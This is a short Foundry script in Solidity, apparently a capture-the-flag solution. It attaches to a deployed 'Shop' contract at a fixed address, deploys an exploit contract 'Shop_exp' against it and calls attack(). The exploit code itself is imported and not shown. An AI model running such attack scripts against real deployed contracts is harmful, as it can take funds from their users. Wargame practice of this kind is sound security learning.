// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Shop.sol";
import "../src/Shop_exp.sol";
contract Shop_Script is Script{

    uint256 deployer;
    Shop e;
    Shop_exp e_exp;
    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);
        // e = new Shop();
        e = Shop(address(0xA46a1fC8C6507ab3a57e17EEEBAbC21b8b2d3e42));
        // address payable e = payable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        // address payable e = payable(0x5FbDB2315678afecb367f032sd93F642f64180aa3);
        e_exp = new Shop_exp(e);
        e_exp.attack();

        vm.stopBroadcast();
    }


    function run() public {

    }
}